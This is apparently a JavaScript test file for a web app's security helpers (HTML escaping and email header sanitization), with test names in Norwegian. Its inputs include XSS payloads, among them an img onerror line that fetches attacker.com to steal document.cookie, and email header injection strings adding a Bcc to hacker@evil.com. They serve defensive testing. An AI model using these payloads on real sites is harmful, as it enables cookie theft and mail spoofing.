import test from 'node:test';
import assert from 'node:assert/strict';
import { 
  escapeHtml, 
  escapeHtmlWithLineBreaks, 
  sanitizeEmail, 
  sanitizeEmailSubject 
} from '../src/utils/security.js';

test('Security Utility - escapeHtml (XSS og HTML-injeksjonsbeskyttelse)', async (t) => {
  await t.test('koder HTML-spesialtegn korrekt', () => {
    assert.equal(escapeHtml('Tom & Jerry <test> "sitat" \'apostrof\''), 'Tom &amp; Jerry &lt;test&gt; &quot;sitat&quot; &#39;apostrof&#39;');
  });

  await t.test('nøytraliserer ondsinnede script-tagger', () => {
    const malicious = '<script>alert("XSS")</script>';
    const escaped = escapeHtml(malicious);
    assert.equal(escaped, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    assert.ok(!escaped.includes('<script>'));
    assert.ok(!escaped.includes('</script>'));
  });

  await t.test('nøytraliserer ondsinnede HTML-lenker med javascript-protokoll', () => {
    const malicious = '<a href="javascript:stealTokens()">Klikk her for gratis gave</a>';
    const escaped = escapeHtml(malicious);
    assert.equal(escaped, '&lt;a href=&quot;javascript:stealTokens()&quot;&gt;Klikk her for gratis gave&lt;/a&gt;');
    assert.ok(!escaped.includes('<a '));
  });

  await t.test('nøytraliserer bilder med onerror og andre inline event handlers', () => {
    const malicious = '<img src="invalid-image.jpg" onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)" />';
    const escaped = escapeHtml(malicious);
    assert.ok(!escaped.includes('<img'));
    assert.ok(escaped.includes('&lt;img'));
    assert.ok(escaped.includes('onerror=&quot;'));
  });

  await t.test('håndterer null, undefined og tall trygt', () => {
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
    assert.equal(escapeHtml(12345), '12345');
    assert.equal(escapeHtml(''), '');
  });
});

test('Security Utility - escapeHtmlWithLineBreaks (Sikre linjeskift i meldinger)', async (t) => {
  await t.test('konverterer \\n og \\r\\n til <br />', () => {
    const input = 'Første linje\nAndre linje\r\nTredje linje';
    const expected = 'Første linje<br />Andre linje<br />Tredje linje';
    assert.equal(escapeHtmlWithLineBreaks(input), expected);
  });

  await t.test('nøytraliserer HTML-tags samtidig som linjeskift bevares', () => {
    const input = 'Hei!\n<script>alert(1)</script>\n<img src=x onerror=alert(2)>\nTakk for meg.';
    const result = escapeHtmlWithLineBreaks(input);
    assert.ok(!result.includes('<script>'));
    assert.ok(!result.includes('<img'));
    assert.ok(result.includes('&lt;script&gt;alert(1)&lt;/script&gt;<br />'));
    assert.ok(result.includes('&lt;img src=x onerror=alert(2)&gt;<br />'));
  });

  await t.test('håndterer null og undefined', () => {
    assert.equal(escapeHtmlWithLineBreaks(null), '');
    assert.equal(escapeHtmlWithLineBreaks(undefined), '');
  });
});

test('Security Utility - sanitizeEmail og sanitizeEmailSubject (Header-injeksjonsbeskyttelse)', async (t) => {
  await t.test('sanitizeEmail fjerner linjeskift og kontrolltegn', () => {
    const evilEmail = "victim@example.com\r\nBcc: hacker@evil.com\r\nSubject: Spoofed";
    const cleaned = sanitizeEmail(evilEmail);
    assert.equal(cleaned, "victim@example.comBcc: hacker@evil.comSubject: Spoofed");
    assert.ok(!cleaned.includes('\r'));
    assert.ok(!cleaned.includes('\n'));
  });

  await t.test('sanitizeEmail bevarer gyldige e-postadresser', () => {
    assert.equal(sanitizeEmail(' ola.nordmann@hkpc.no '), 'ola.nordmann@hkpc.no');
    assert.equal(sanitizeEmail('school+support@hiskingdomministry.no'), 'school+support@hiskingdomministry.no');
  });

  await t.test('sanitizeEmailSubject fjerner linjeskift for å hindre response splitting', () => {
    const evilSubject = "Ny søknad\r\nContent-Type: text/html\r\n\r\n<script>evil()</script>";
    const cleaned = sanitizeEmailSubject(evilSubject);
    assert.ok(!cleaned.includes('\r'));
    assert.ok(!cleaned.includes('\n'));
    assert.equal(cleaned, "Ny søknad Content-Type: text/html <script>evil()</script>");
  });

  await t.test('håndterer tomme verdier', () => {
    assert.equal(sanitizeEmail(null), '');
    assert.equal(sanitizeEmail(''), '');
    assert.equal(sanitizeEmailSubject(null), '');
    assert.equal(sanitizeEmailSubject(''), '');
  });
});
